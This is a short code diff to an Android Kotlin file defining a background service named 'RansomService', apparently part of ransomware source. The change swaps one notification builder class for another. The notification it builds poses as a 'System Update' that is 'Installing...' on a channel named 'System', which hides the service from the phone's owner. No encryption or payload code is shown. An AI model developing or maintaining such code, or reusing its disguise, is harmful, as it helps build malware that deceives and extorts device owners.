@@ -4,7 +4,6 @@ import android.app.*
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
-import androidx.core.app.NotificationCompat
 
 class RansomService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
@@ -25,7 +24,7 @@ class RansomService : Service() {
             val c = NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(c)
         }
-        return NotificationCompat.Builder(this, ch)
+        return Notification.Builder(this, ch)
             .setContentTitle("System Update")
             .setContentText("Installing...")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
